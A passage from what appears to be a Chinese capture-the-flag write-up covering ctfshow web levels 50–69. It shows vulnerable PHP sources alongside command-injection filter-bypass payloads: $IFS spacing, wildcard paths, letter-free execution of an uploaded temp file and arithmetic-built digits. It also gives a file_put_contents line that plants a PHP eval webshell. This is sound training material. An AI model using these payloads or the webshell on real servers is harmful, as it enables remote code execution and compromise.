+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>\x09</code>、<code>\x26</code>。</p>
+<p>依旧可以使用上一关的 PAYLOAD。</p>
+<h2 id="web51-输出重定向-10"><a href="#web51-输出重定向-10" class="headerlink" title="web51 输出重定向 - 10"></a>web51 输出重定向 - 10</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡跟上一关好像没区别…</p>
+<h2 id="web52-输出重定向-11"><a href="#web52-输出重定向-11" class="headerlink" title="web52 输出重定向 - 11"></a>web52 输出重定向 - 11</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>&gt;</code>、<code>&lt;</code> 字符，但是把 <code>$</code> 放出来了。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl$IFS/fla\g||</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218880_65a39340477e8e2136bd3.png"><img src="https://image.3001.net/images/20240114/1705218880_65a39340477e8e2136bd3.png" alt="image-20231022165622239"></a></p>
+<p>与上关不同的是，虽说网站根目录存在 <code>flag.php</code> 文件，但是文件内容为空。其真实的 flag 在根目录下。</p>
+<h2 id="web53-输出重定向-12"><a href="#web53-输出重定向-12" class="headerlink" title="web53 输出重定向 - 12"></a>web53 输出重定向 - 12</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl$&#123;IFS&#125;fla\g.p\hp</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218885_65a39345e405c00fe9f52.png"><img src="https://image.3001.net/images/20240114/1705218885_65a39345e405c00fe9f52.png" alt="image-20231022193139625"></a></p>
+<p>这里也可以使用如下 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure>
+
+<h2 id="web54-过滤所有读取文件命令"><a href="#web54-过滤所有读取文件命令" class="headerlink" title="web54 过滤所有读取文件命令"></a>web54 过滤所有读取文件命令</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现这里过滤了 <code>;</code>，<code>cat</code>、<code>flag</code>、<code>空格</code>、<code>0-9</code>、<code>*</code>、<code>more</code>、<code>wget</code>、<code>less</code>、<code>head</code>、<code>sort</code>、<code>tail</code>、<code>sed</code>、<code>cut</code>、<code>tac</code>、<code>awk</code>、<code>strings</code>、<code>od</code>、<code>curl</code>、<code>nl</code>、<code>scp</code>、<code>rm</code>、<code>反引号</code>、<code>%</code>、<code>\x09</code>、<code>\x26</code>、<code>&gt;</code>、<code>&lt;</code></p>
+<p>其中因为有了类似于 <code>.*c.*a.*t.*</code> 这种规则，我们的 <code>ca&#39;&#39;t</code> 则无法绕过。下面放张图：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218903_65a39357647e0ad8e6160.png"><img src="https://image.3001.net/images/20240114/1705218903_65a39357647e0ad8e6160.png" alt="image-20231022194315713"></a></p>
+<p>发现无论 <code>ca</code> 和 <code>t</code> 之间中间有什么字符都能匹配到，故而 <code>ca&#39;&#39;t</code> 无法绕过。</p>
+<p>这里就需要知道 <code>cat</code> 命令存储的位置了，一般情况下，Linux 内置的命令都存储在 <code>/bin</code> 目录下。</p>
+<p>我们可以使用通配符去匹配 <code>/bin</code> 目录下的 <code>cat</code> 命令。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218908_65a3935c5a3d53b3ad89c.png"><img src="https://image.3001.net/images/20240114/1705218908_65a3935c5a3d53b3ad89c.png" alt="image-20231022200424942"></a></p>
+<h2 id="web55-无字母-RCE-1"><a href="#web55-无字母-RCE-1" class="headerlink" title="web55 无字母 RCE-1"></a>web55 无字母 RCE-1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现过滤了 <code>;</code>、<code>a-z</code>、<code>反引号</code>、<code>%</code>、<code>\x09</code>、<code>\x26</code>、<code>&gt;</code>、<code>&lt;</code>。</p>
+<p>但是 并没有过滤 <code>.</code>、<code>?</code>、<code>*</code> 符号。</p>
+<p>当我们向服务器 POST 一个文件时，此时该文件会短暂的存储在 服务器的 <code>/tmp</code> 目录下，名称为：<code>php+6个随机字符</code></p>
+<p>请看示例：</p>
+<p>这里我们准备如下 HTML 源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://172.20.10.2/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">sleep(10); // 为了让程序不那么快结束</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>准备一个名为 <code>hello.txt</code> 的文件，内容为：<code>hello world Hello X1ong!!!</code></p>
+<p>将该文件通过文件上传接口，上传到 <code>172.20.10.2</code> 当中，可以看到，已经传输到服务器的 <code>/tmp</code> 目录下，上传之后的保存的文件名为 <code>php+6位随机字符</code>。</p>
+<p><strong>不过，该文件会在 PHP 程序执行完毕之后自动删除。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218914_65a39362d58c5a634a4ed.png"><img src="https://image.3001.net/images/20240114/1705218914_65a39362d58c5a634a4ed.png" alt="image-20231022210608960"></a></p>
+<p>程序运行结束之后，文件删除：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218918_65a39366b4cb8d3f59b45.png"><img src="https://image.3001.net/images/20240114/1705218918_65a39366b4cb8d3f59b45.png" alt="image-20231022211020245"></a></p>
+<p>假设我们有一个名为 <code>xx.txt</code> 的文件，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>我们编写文件上传 HTML 代码，将<strong>服务器</strong>地址指向靶机地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://4b268dea-539c-46a0-99af-39cf52af50e9.challenge.ctf.show/&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;#file&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用 BP 抓取上传 <code>xx.txt</code> 的数据包：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218924_65a3936c803f85c8524b5.png"><img src="https://image.3001.net/images/20240114/1705218924_65a3936c803f85c8524b5.png" alt="image-20231022211953319"></a></p>
+<p><strong>没回显的话多发几次。</strong></p>
+<p><strong>POC 解读：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">.+/???/????????[@-[]</span><br></pre></td></tr></table></figure>
+
+<p>在 Linux 中我们可以使用 <code>.</code> 代替 <code>source</code> 命令去执行 shell 脚本。如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218928_65a3937033282d6095408.png"><img src="https://image.3001.net/images/20240114/1705218928_65a3937033282d6095408.png" alt="image-20231022212228716"></a></p>
+<p>其中的 <code>?</code> 表示通配符。<code>+</code> 为 url 编码中的空格。<code>?</code> 则是 Linux 中的通配符。</p>
+<p>因此 <code>.+/???/????????[@-[]</code> 其实就是 <code>. /tmp/php6个随机字符</code> 后面的 <code>[@-[]</code> 是 linux 下面的匹配符，是进行匹配的大写字母，表示一个范围，从 ASCII 字符中大写字母在 <code>@</code>至 <code>[</code>之间，故而写成 <code>[@-[]</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218931_65a3937325eda9ced0ad3.png"><img src="https://image.3001.net/images/20240114/1705218931_65a3937325eda9ced0ad3.png" alt="image-20231022214757428"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218933_65a3937597f2406dc79d5.png"><img src="https://image.3001.net/images/20240114/1705218933_65a3937597f2406dc79d5.png" alt="image-20231022214937554"></a></p>
+<p><strong>具体参见 P 神文章：</strong><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<h2 id="web56-无字母数字-RCE-1"><a href="#web56-无字母数字-RCE-1" class="headerlink" title="web56 无字母数字 RCE-1"></a>web56 无字母数字 RCE-1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>0-9</code>、<code>$</code>、<code>(</code>、<code>&#123;</code>、<code>单引号</code>、<code>双引号</code>，但是没有过滤 <code>?</code>、<code>/</code>、以及 <code>[</code>、<code>]</code>，因此还可以使用上一题的方式进行解题：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218937_65a3937920ba9c78d7b97.png"><img src="https://image.3001.net/images/20240114/1705218937_65a3937920ba9c78d7b97.png" alt="image-20231023140052489"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218939_65a3937b734de9b29225c.png"><img src="https://image.3001.net/images/20240114/1705218939_65a3937b734de9b29225c.png" alt="image-20231023140130178"></a></p>
+<h2 id="web57-无字母数字-RCE-2"><a href="#web57-无字母数字-RCE-2" class="headerlink" title="web57 无字母数字 RCE-2"></a>web57 无字母数字 RCE-2</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过代码审计发现这里还是个无字母数字的命令执行。</p>
+<p>比上一题多过滤了 <code>.</code>、<code>,</code>、<code>?</code>、<code>*</code>、<code>-</code>、<code>=</code>、<code>[</code>，因此基于上一题的做法是行不通的。</p>
+<p>这里根据提示 flag 在 <code>36.php</code> 中，因此这里我们只需要传入 <code>?c=36</code> 即可查看 FLAG。</p>
+<p>但是！！！</p>
+<p>这里不允许传入数字。我们该怎么构造得到数字 36 呢？看了一下，发现放出了 <code>$</code>、<code>()</code>、<code>~</code>。</p>
+<p>那么这里我们可以使用 Linux 的 <code>$(())</code> 构造出 36。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">$(())=0</span><br><span class="line">$((~ $(()) ))=-1</span><br></pre></td></tr></table></figure>
+
+<p><code>(())</code> 是用来整数运算的命令，内部可以放表达式，默认相加，通过 <code>$((36))</code> 可得 <code>36</code>，如果使用 <code>$((~37))</code> 取反为 <code>-37</code>。</p>
+<p>36 可以通过外层为 <code>$(())</code> 包裹内层可以运算出 36 的表达式构造，36 由 - 37 取反得到，所以</p>
+<p><code>$((~$(( ))))</code> 的内部加上 37 个 <code>$((~ $(()) ))</code> 得到 -37，最终在使用开头的取反，得到 36 。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=$((~ $(($((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) ))$((~ $(()) )))) ))</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218944_65a393805c4139a6baad3.png"><img src="https://image.3001.net/images/20240114/1705218944_65a393805c4139a6baad3.png" alt="image-20231023142353680"></a></p>
+<h2 id="web58-函数禁用-1"><a href="#web58-函数禁用-1" class="headerlink" title="web58 函数禁用 - 1"></a>web58 函数禁用 - 1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过检测发现过滤了很多函数，但是 <code>show_source</code> 和 <code>highlight_file</code> 函数并没有禁用，可以直接读取 flag.php 文件的内容。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218948_65a39384a78a440485c3e.png"><img src="https://image.3001.net/images/20240114/1705218948_65a39384a78a440485c3e.png" alt="image-20231023182423670"></a></p>
+<p>当我们这里经过测试，发现 <code>file_get_contents</code> 等函数其实也可以进行文件读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">c=readfile(&quot;flag.php&quot;);</span><br><span class="line">c=var_dump(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=print_r(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);</span><br><span class="line">// 这里解释一下，file函数是将整个文件读到索引数组中，每行是一个元素。</span><br></pre></td></tr></table></figure>
+
+<h2 id="web59-函数禁用-2"><a href="#web59-函数禁用-2" class="headerlink" title="web59 函数禁用 - 2"></a>web59 函数禁用 - 2</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用 <code>file_put_contents</code> 函数向目标服务器写入 <code>webshell</code> 进行连接，从而获取 FLAG 值。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218952_65a39388e003ff1b4fc46.png"><img src="https://image.3001.net/images/20240114/1705218952_65a39388e003ff1b4fc46.png" alt="image-20231023190615470"></a></p>
+<p>其他 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=var_dump(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=print_r(file(&#x27;flag.php&#x27;));</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web60-65-函数禁用-3"><a href="#web60-65-函数禁用-3" class="headerlink" title="web60-65 函数禁用 - 3"></a>web60-65 函数禁用 - 3</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里依旧可以使用 <code>file_put_contents</code> 函数获取服务器的 webshell 权限。但是这里由于禁用了某些函数导致拿到 shell 之后，无法通过中国蚁剑工具进行查看或下载 flag 文件。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218956_65a3938c927771eb2c9fd.png"><img src="https://image.3001.net/images/20240114/1705218956_65a3938c927771eb2c9fd.png" alt="image-20231023191751700"></a></p>
+<p>其他 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web66-67-函数禁用-4"><a href="#web66-67-函数禁用-4" class="headerlink" title="web66-67 函数禁用 - 4"></a>web66-67 函数禁用 - 4</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用 <code>show_source</code> 提示函数被禁用，接着使用 <code>highlight_file</code> 函数发现可以读取 <code>flag.php</code> 但是里面并没有 FLAG 值。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218973_65a3939d05297b5035923.png"><img src="https://image.3001.net/images/20240114/1705218973_65a3939d05297b5035923.png" alt="image-20231023194323425"></a></p>
+<p>尝试使用 <code>scandir</code> 函数读取当前目录，发现并无其他文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218976_65a393a0e4b3ca7fab2b7.png"><img src="https://image.3001.net/images/20240114/1705218976_65a393a0e4b3ca7fab2b7.png" alt="image-20231023194437813"></a></p>
+<p>接着尝试使用 <code>scandir</code> 函数读取服务器的根目录下内容：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218979_65a393a39d1b9ba55b63b.png"><img src="https://image.3001.net/images/20240114/1705218979_65a393a39d1b9ba55b63b.png" alt="image-20231023194631879"></a></p>
+<p>发现根目录存在 <code>flag.txt</code> 文件，这里我们可以使用 <code>highlight_file</code> 函数 或 <code>include</code> 以及 <code>require</code> 函数进行读取。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218982_65a393a6c51be08bc39b9.png"><img src="https://image.3001.net/images/20240114/1705218982_65a393a6c51be08bc39b9.png" alt="image-20231023194753711"></a></p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include_once(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web68-函数禁用-5"><a href="#web68-函数禁用-5" class="headerlink" title="web68 函数禁用 - 5"></a>web68 函数禁用 - 5</h2><p>访问页面，提示如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218987_65a393abbbad0032be3c1.png"><img src="https://image.3001.net/images/20240114/1705218987_65a393abbbad0032be3c1.png" alt="image-20231023220832409"></a></p>
+<p>很明显，<code>highlight_file</code> 函数被禁用了。</p>
+<p>这里依旧可以使用 <code>scandir</code> 函数列出，最终 FLAG 在根目录下，名为 <code>flag.txt</code> ，使用上一题 PAYLOAD 读取即可。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include_once(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web69-函数禁用-6"><a href="#web69-函数禁用-6" class="headerlink" title="web69 函数禁用 - 6"></a>web69 函数禁用 - 6</h2><p>访问页面，提示如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218991_65a393af4031295dbbb86.png"><img src="https://image.3001.net/images/20240114/1705218991_65a393af4031295dbbb86.png" alt="image-20231023220832409"></a></p>
+<p>尝试使用 <code>scandir()</code> 函数获取当前目录下的内容，发现打印数组的函数 <code>var_dump</code> 和 <code>print_r</code> 被禁用，于是只能使用 <code>foreach</code> 进行遍历数组中的元素打印：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=foreach (scandir(&#x27;.&#x27;) as $file) &#123;echo $file . &quot;&lt;br/&gt;&quot;;&#125;;</span><br></pre></td></tr></table></figure>
+
